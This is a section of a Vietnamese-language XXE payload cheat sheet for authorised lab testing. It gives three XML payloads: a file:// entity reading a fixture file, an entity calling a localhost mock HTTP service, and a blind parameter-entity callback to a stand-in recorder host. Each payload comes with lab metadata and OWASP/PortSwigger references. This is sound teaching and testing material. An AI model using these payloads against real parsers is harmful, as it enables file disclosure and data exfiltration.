# 4. XML External Entity (XXE)

> [!CAUTION]
> Chỉ dùng trong lab local được ủy quyền. Fixture phải chặn outbound network, chỉ mount dữ liệu giả và giới hạn CPU/memory/time.

> **Phạm vi kiểm chứng:** Các block dưới đây ở mức `static-verified`, chưa phải lab evidence. Những biến thể phụ thuộc local DTD, wrapper, encoding legacy hoặc công cụ chưa được giữ vì chưa có fixture/version tái lập.

XXE xuất hiện khi XML parser phân giải external entity do actor kiểm soát. Kết luận phải dựa trên file/mock-service/callback marker của fixture, không dựa riêng vào lỗi parser.

### 4.1. External entity đọc file fixture

<!-- payload-id: CHEAT-04-001 -->
<!-- context: Java 17 JAXP fixture with external general entities deliberately enabled; synthetic file mounted at /tmp/sechub-lab/fixture.txt -->
<!-- prerequisites: run in a disposable container; mount only the named synthetic file; record parser configuration and block outbound network -->
<!-- encoding: UTF-8 XML bytes matching the declaration; no transport-layer decode -->
<!-- expected-result: the vulnerable fixture returns the synthetic SECHUB marker; the fixed parser rejects DOCTYPE/external resolution -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY marker SYSTEM "file:///tmp/sechub-lab/fixture.txt">
]>
<root>&marker;</root>
```

### 4.2. External entity tới mock HTTP service

<!-- payload-id: CHEAT-04-002 -->
<!-- context: Java 17 JAXP fixture; mock HTTP service listens only at 127.0.0.1:18082 and returns SECHUB_HTTP_MARKER -->
<!-- prerequisites: isolate the network namespace; allow only the mock address; capture parser and mock-service logs -->
<!-- encoding: UTF-8 XML bytes; the HTTP URL is not normalized or decoded by another layer -->
<!-- expected-result: the vulnerable parser makes one request to the mock service; the fixed parser makes none -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY marker SYSTEM "http://127.0.0.1:18082/marker">
]>
<root>&marker;</root>
```

### 4.3. Blind callback tới recorder local

<!-- payload-id: CHEAT-04-003 -->
<!-- context: Java 17 JAXP fixture; callback.lab.test resolves to a loopback HTTP recorder on port 18081 -->
<!-- prerequisites: use a network namespace with no public egress; reset recorder state and capture exactly one parse attempt -->
<!-- encoding: UTF-8 XML bytes; parameter-entity percent signs are preserved -->
<!-- expected-result: the vulnerable parser creates one loopback callback; the fixed parser rejects the DTD and creates none -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % callback SYSTEM "http://callback.lab.test:18081/ping">
  %callback;
]>
<root>SECHUB</root>
```

## Tài liệu tham khảo

- **[S1]** OWASP XML External Entity Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
- **[S2]** PortSwigger Web Security Academy — XML external entity injection. https://portswigger.net/web-security/xxe — bản hiện hành; truy cập: 2026-07-18.
